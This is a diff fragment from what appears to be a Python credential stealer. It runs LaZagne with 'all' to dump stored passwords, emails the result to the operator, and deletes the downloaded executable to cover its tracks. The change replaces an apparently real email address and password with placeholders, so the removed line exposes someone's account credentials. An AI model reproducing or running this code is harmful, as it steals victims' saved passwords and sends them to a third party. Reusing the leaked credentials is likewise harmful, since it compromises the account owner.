@@ -34,7 +34,7 @@ command = "laZagne.exe all"
 result = subprocess.check_output(command, shell=True)
 
 #send file to email
-send_mail("iwunduchinonso1@gmail.com", "mouau1221108", result)
+send_mail("your email", "your password", result)
 
 #remove download file
 os.remove("laZagne.exe")
